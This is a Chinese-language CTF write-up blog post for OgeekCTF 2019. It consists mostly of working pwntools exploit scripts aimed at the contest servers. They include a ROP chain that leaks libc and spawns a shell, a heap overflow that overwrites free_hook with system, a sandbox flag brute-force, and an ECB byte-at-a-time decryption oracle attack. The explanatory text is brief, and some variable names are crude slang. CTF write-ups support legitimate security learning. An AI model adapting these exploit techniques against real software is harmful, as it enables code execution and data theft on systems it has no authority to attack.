---
layout: post
title:  "OgeekCTF-Writeup"
date:   2019-8-26
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF]
icon: icon-html
---

# OgeekCTF-Writeup

* ### babyrop

  进入白给函数之后rop基本操作就完事了

  ```python
  from pwn import *
  
  puts_plt = 0x08048548
  puts_got = 0x08049FD4
  write_plt  = 0x8048578
  write_got = 0x8049FEC
  context.log_level = 'debug'
  libc = ELF('./libc-2.23.so')
  k = True
  write_libc = 0xf7ed9b70
  offset  = libc.symbols['write']
  p = remote('47.112.137.238',13337)
  payload1 = '\x00'*7+p64(0xff)
  p.sendline(payload1)
  print p.recv()
  payload2 = 'a'*0xe7+p32(0x1111)+p32(write_plt)+p32(0x08048825)+p32(1)+p32(write_got)+p32(10)
  print hex(len(payload2))
  p.send(payload2)
  write_libc = u32(p.recv()[0:4])
  
  log.success("Write_libc:"+hex(write_libc))
  log.success("write_offset:"+hex(offset))
  libc.address = write_libc-offset
  
  log.success("libc:"+hex(libc.address))
  log.success('system:'+hex(libc.symbols['system']))
  
  p.sendline(payload1)
  print p.recv()
  payload3 = 'a'*0xe7+p32(1111)+p32(libc.address+0x3a80c)+p32(0)*20
  p.sendline(payload3)
  
  p.interactive()
  
  
  
  ```

* ### PyBox

  * #### 非预期解

    ```python
    from pwn import *
    import string 
    chars = '{}_'+string.letters+string.digits 
    r = remote('47.112.108.17',12312)
    
    '''
    >>>f = open('/home/flag')
    >>>a = f.read()
    >>>if a[0]=='f':fuck
    try again !XD
    >>>if a[0]=='n':fuck
    '''
    flag = 'flag{'
    index = len(flag)-1
    r.sendline("f = open('/home/flag')")
    r.sendline("a = f.read()")
    r.interactive()
    while '}' not in flag:
    	for i in chars:
    		payload = 'if a[{}]==\'{}\':fuck'.format(str(index),i)
    		log.info(payload)
    		r.sendline(payload)
    		nmsl = r.recvuntil('XD',timeout=3)
    		if 'try again' in nmsl:
    			flag += i
    			log.success(flag)
    			index += 1
    			break
    r.interactive()
    
    ```

* ### bookmanager

  堆地址白给，存在堆溢出

  先搞一个unsorted bin，fd、bk为main_arena+88

  然后堆溢出改另一个块指向text的指针，指向unsorted bin的fd，preview可以得到main_arena+88，泄露libc

  指向text的指针指向free_hook然后update可以写free_hook

  在text中写/bin/sh，把free_hook写成system然后free这个text

  ```python
  from pwn import *
  context.log_level = 'debug'
  r = remote('47.112.115.30',13337)
  
  def add_chapter(c_name):
      r.recvuntil('choice:')
      r.sendline('1')
      r.recvuntil('name:')
      r.sendline(c_name)
  
  def add_section(c_name,s_name):
      r.recvuntil('choice:')
      r.sendline('2')
      r.recvuntil('add into:')
      r.sendline(c_name)
      r.recvuntil('0x')
      leak_heap = u64(r.recvuntil('\n',drop=True),16)
      r.recvuntil('name:')
      r.sendline(s_name)
      return leak_heap
  
  def add_text(s_name,text,text_size):
      r.recvuntil('choice:')
      r.sendline('3')
      r.recvuntil('add into:')
      r.sendline(s_name)
      r.recvuntil('write:')
      r.sendline(str(text_size))
      r.recvuntil('Text:')
      r.sendline(text)
  
  def remove_chapter(c_name):
      r.recvuntil('choice:')
      r.sendline('4')
      r.recvuntil(' name:')
      r.sendline(c_name)
  
  def remove_section(s_name):
      r.recvuntil('choice:')
      r.sendline('5')
      r.recvuntil(' name:')
      r.sendline(s_name)
  
  def remove_text(s_name):
      r.recvuntil('choice:')
      r.sendline('6')
      r.recvuntil(' name:')
      r.sendline(s_name)
  
  def book_preview():
      r.recvuntil('choice:')
      r.sendline('7')
  
  def update_text(s_name,text):
      r.recvuntil('choice:')
      r.sendline('8')
      r.recvuntil('Text):')
      r.sendline('Text')
      r.recvuntil('name:')
      r.sendline(s_name)
      r.recvuntil('Text:')
      r.send(text)
  
  r.recvuntil('create: ')
  r.sendline('nmsl')
  
  add_chapter('a')
  add_section('a','b1')
  add_text('b1','c1',0x20)
  
  leak_heap = add_section('a','b2')
  log.success(hex(leak_heap))
  add_text('b2','c2',0x80)
  add_section('a','b3')
  remove_text('b2')
  remove_section('b1')
  add_section('a','b1')
  payload = 'a'*80 + p64(leak_heap+0x40)
  
  add_text('b1',payload,0x20)
  
  book_preview()
  r.recvuntil('Text:')
  r.recvuntil('Text:')
  main_arena_88 = u64(r.recv(6).ljust(8,'\x00'))
  libc_base = main_arena_88 - 88 - 0x3c4b20
  free_hook = libc_base + 0x3c67a8
  system_addr = libc_base + 0x45390
  log.success(hex(libc_base))
  add_text('b3','c3',0x80)
  
  add_section('a','b4')
  add_text('b4','c4',0x20)
  add_section('a','b5')
  add_text('b5','c5',0x20)
  payload = '/bin/sh\x00' + p64(0)*4 + p64(0x41) + p64(0x003562) 
  payload += p64(0)*3 + p64(free_hook) + p64(0x20)
  update_text('b4',payload)
  update_text('b5',p64(system_addr))
  remove_text('b4')
  
  r.interactive()
  ```

  

* ### 2019

  zsteg找到一串base64，解码得到一串base85，解码得到flag

* ### Babycry

  输入十六个相同字符发现密文前两个块相同，应该是ECB

  先试出来flag的长度

  根据hint，明文会被`_`填充为8的倍数，那么从1开始增加输入字符的数量，直到密文长度发生变化，即填满了一个长度为8的块后又多了一个块，就可以得到flag长度

  然后从后往前爆破flag最后八位。如爆破最后一位，把最后一位挤到一个新的块，即`}_______`，密文的最后一个块就是`}_______`的密文，再明文开头输入`*_______`，爆破*，直到密文第一个块与密文最后一个块相同，就得到了flag的最后一位。以此类推，得到flag。

  

  ```python
  from pwn import *
  import string
  chars = '{}_'+string.digits + string.letters
  r = remote('139.9.222.76',19999)
  
  def dec(plain):
  	r.recvuntil('>')
  	r.sendline('des '+ plain)
  	return r.recvline().strip()
  
  flag_len = 46
  padding_len = 2
  
  flag_ass =''
  while True:
  	block_padding_len = 7
  	fuck_len = 1
  	for i in chars:
  		log.info(i)
  		padding = (block_padding_len+padding_len+fuck_len)*'_' 
  		payload = i + flag_ass + padding
  		fuck = dec(payload)
  		if fuck[0:16] == fuck[-16:]:
  			flag_ass = i + flag_ass
  			log.success(flag_ass)
  			break
  	block_padding_len -= 1
  	fuck_len += 1
  	
  index1 = -32
  index2 = -16
  while True:
  	if len(flag_ass) != 8 and len(flag_ass) % 8 == 0:
  		index1 -= 16
  		index2 -= 16
  		print(index1,index2)
  	for i in chars:
  		log.info(i)
  		padding = padding_len*'_' 
  		payload = i + flag_ass + padding
  		fuck = dec(payload)
  		if fuck[0:16] == fuck[index1:index2]:
  			flag_ass = i + flag_ass
  			log.success(flag_ass)
  			break
  	if 'flag' in flag_ass:
  		log.success(flag_ass)
  		break
  r.interactive()
  ```

  

